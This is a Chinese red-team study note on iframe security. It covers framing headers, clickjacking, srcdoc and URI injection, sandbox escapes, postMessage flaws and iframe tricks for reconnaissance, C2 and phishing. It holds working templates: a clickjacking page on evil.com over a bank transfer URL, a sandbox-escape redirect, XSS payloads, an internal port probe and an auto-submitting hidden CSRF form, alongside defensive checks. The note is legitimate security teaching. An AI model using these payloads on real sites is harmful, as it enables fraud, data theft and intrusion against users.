## 目录

- [[#一、iframe基础|一、iframe基础]]
- [[#二、iframe安全属性|二、iframe安全属性]]
- [[#三、Clickjacking攻击|三、Clickjacking攻击]]
- [[#四、Frame注入与内容注入|四、Frame注入与内容注入]]
- [[#五、sandbox沙箱详解|五、sandbox沙箱详解]]
- [[#六、PostMessage跨域通信|六、PostMessage跨域通信]]
- [[#七、iframe在红队中的应用|七、iframe在红队中的应用]]
- [[#八、红队视角总结|八、红队视角总结]]

---

## 一、iframe基础

`<iframe>` （Inline Frame）用于在当前页面内嵌入另一个HTML文档。

```html
<iframe src="https://example.com/page" width="600" height="400"></iframe>
```

基本属性：

| 属性 | 说明 |
|------|------|
| `src` | 嵌入页面的URL |
| `srcdoc` | 直接用HTML字符串定义内容（无需URL） |
| `name` | iframe的名称，用于`<a target>`和`window.open` |
| `width/height` | 尺寸 |
| `sandbox` | 安全沙箱限制 |
| `allow` | 权限策略（Permissions Policy） |
| `loading` | 懒加载 (`lazy`/`eager`) |

## 二、iframe安全属性

### X-Frame-Options（响应头，传统方式）

| 值 | 效果 |
|-----|------|
| `DENY` | 禁止任何页面嵌入 |
| `SAMEORIGIN` | 仅同源可嵌入 |
| `ALLOW-FROM uri` | 仅指定源可嵌入（已废弃） |

### CSP frame-ancestors（现代方式，推荐）

```
Content-Security-Policy: frame-ancestors 'self' https://trusted.com
Content-Security-Policy: frame-ancestors 'none'
```

CSP的`frame-ancestors`替代了X-Frame-Options，更灵活：
- 支持多个源
- 支持通配符`*`
- 支持`'self'`, `'none'`

## 三、Clickjacking攻击

### 攻击原理

攻击者在自己的页面用透明iframe层叠覆盖在目标网站之上，诱骗用户点击。用户以为自己点击了攻击者的页面按钮，实际点击了透明层下的目标网站按钮。

### 攻击模板

```html
<!-- 攻击者的evil.com页面 -->
<html>
<head>
<style>
  #target-frame {
    position: absolute;
    top: 0;
    left: 0;
    width: 800px;
    height: 600px;
    opacity: 0.001;     /* 几乎完全透明 */
    z-index: 2;
  }
  #decoy {
    position: absolute;
    top: 100px;
    left: 100px;
    z-index: 1;
  }
</style>
</head>
<body>
  <div id="decoy">
    <button>点击赢取iPhone!</button>
  </div>
  <iframe id="target-frame"
    src="https://bank.com/transfer?to=attacker&amount=10000"
    scrolling="no">
  </iframe>
</body>
</html>
```

### 高级Clickjacking技巧

**1. 拖拽劫持（Drag-and-Drop）**
诱导用户拖拽界面元素（如从攻击者页面拖到iframe中），可能触发文件上传或数据泄露。

**2. 多次点击劫持**
利用 `pointer-events: none` 在iframe上开"孔"，只在特定区域允许点击穿透。

**3. 移动端Clickjacking**
利用触摸事件、双击缩放等移动端特有行为。

### 防御检测

```
// JS防御（Frame Busting）
if (top !== self) {
    top.location = self.location;  // 跳出iframe
}

// 但是Frame Busting也可能被绕过：
// 1. sandbox="allow-forms" 的iframe中top.location被禁止
// 2. X-Frame-Options/CSP层面防御更可靠
```

## 四、Frame注入与内容注入

### srcdoc属性注入

```html
<iframe srcdoc="<script>alert(document.domain)</script>"></iframe>
```

如果服务端将用户输入直接拼入`srcdoc`属性，可导致XSS。与`src`不同，`srcdoc`不需要可访问的URL，且注入的JS在当前源的上下文中执行。

### data: URI注入

```html
<iframe src="data:text/html,<script>alert(1)</script>">
```

`data:` URI协议可在iframe中渲染任意HTML，同源策略视其为独立的null源。

### javascript: URI注入

```html
<iframe src="javascript:alert(document.domain)">
```

直接在iframe中执行JS。在某些旧浏览器中有效，现代浏览器已限制。

## 五、sandbox沙箱详解

`sandbox` 属性对iframe内容施加严格限制。无值的sandbox意味着启用所有限制，是最安全的状态。

### sandbox限制与解除

| sandbox值 | 允许的行为 |
|-----------|-----------|
| (空) | 所有限制启用（最安全） |
| `allow-forms` | 表单提交 |
| `allow-scripts` | JavaScript执行 |
| `allow-same-origin` | 视为同源（取消跨域隔离） |
| `allow-top-navigation` | `top.location` 修改 |
| `allow-popups` | `window.open` |
| `allow-modals` | `alert/confirm/prompt` |
| `allow-pointer-lock` | 鼠标指针锁定 |
| `allow-presentation` | 演示API |
| `allow-downloads` | 文件下载 |

### 危险组合

```html
<!-- 危险：allow-scripts + allow-same-origin = 可突破沙箱 -->
<iframe sandbox="allow-scripts allow-same-origin"
  srcdoc="<script>top.location='https://evil.com'</script>">
</iframe>
```

配合`allow-same-origin`，sandbox内的JS可以：
- 访问同源的localStorage/Cookie
- 发出同源AJAX请求
- 理论上可以移除sandbox限制

### 沙箱绕过研究

```
allow-scripts + allow-same-origin 组合是已知的沙箱绕过向量。
因为同源页面可以通过DOM操作修改自身的sandbox属性。
防御：永远不要同时使用 allow-scripts 和 allow-same-origin
```

## 六、PostMessage跨域通信

### API用法

```javascript
// 父页面 → iframe
iframe.contentWindow.postMessage('Hello', 'https://trusted.com');

// iframe内 → 父页面
window.parent.postMessage({type:'response'}, 'https://parent.com');

// 接收端
window.addEventListener('message', function(event) {
    // 必须验证 origin
    if (event.origin !== 'https://trusted.com') return;
    console.log(event.data);
});
```

### PostMessage安全漏洞

**漏洞1：通配符targetOrigin**
```javascript
// 危险 —— 任何源都可接收
window.parent.postMessage(sensitiveData, '*');

// 安全 —— 指定接收方
window.parent.postMessage(sensitiveData, 'https://trusted.com');
```

**漏洞2：未验证event.origin**
```javascript
window.addEventListener('message', function(e) {
    // 危险 —— 接受任何来源的消息
    eval(e.data);  // DOM XSS
});
```

**漏洞3：XSS via PostMessage**
```javascript
// 如果消息处理器不安全地处理e.data：
window.addEventListener('message', function(e) {
    document.getElementById('content').innerHTML = e.data;
    // 攻击者从evil.com发送：
    // postMessage('<img src=x onerror=alert(1)>', '*')
});
```

## 七、iframe在红队中的应用

### 1. 信息收集

通过iframe加载内网地址探测存活服务：

```html
<img src="http://192.168.1.1:8080/favicon.ico" 
     onload="log('192.168.1.1:8080 OPEN')" 
     onerror="log('192.168.1.1:8080 CLOSED')">
```

### 2. C2隐藏通信

将C2面板嵌入正常网页的iframe中，传输心跳和控制指令。

### 3. 钓鱼页面嵌套

在钓鱼域名上嵌入真实银行网站的iframe（透明层），让用户以为是正常登录。

### 4. CSRFP（Cross-Site Request Forgery via iframe）

```html
<iframe name="hiddenFrame" style="display:none"></iframe>
<form action="https://target.com/api/deleteUser" method="POST" 
      target="hiddenFrame">
  <input type="hidden" name="userId" value="1">
</form>
<script>document.forms[0].submit();</script>
```

## 八、红队视角总结

### 攻击向量矩阵

| 攻击 | 核心机制 | 绕过难度 |
|------|---------|---------|
| Clickjacking | 透明iframe覆盖 | 中（需目标无frame-ancestors） |
| srcdoc注入 | iframe属性可控 | 低（条件苛刻） |
| PostMessage XSS | 消息处理器不安全 | 中（需审计JS代码） |
| 内网探测 | iframe加载时序 | 低（现代浏览器限制了） |
| CSRFP | 表单target到iframe | 中（需已知API端点） |

### 检测命令

检查目标是否有Clickjacking防护：
```
curl -I https://target.com | grep -i "x-frame-options\|frame-ancestors"
```

检查PostMessage监听：
```
// 在Chrome DevTools Console中
getEventListeners(window).message
```

---
**返回** [[HTML基础总目录|HTML基础总目录]] | [[../前端基础总目录|前端基础总目录]]
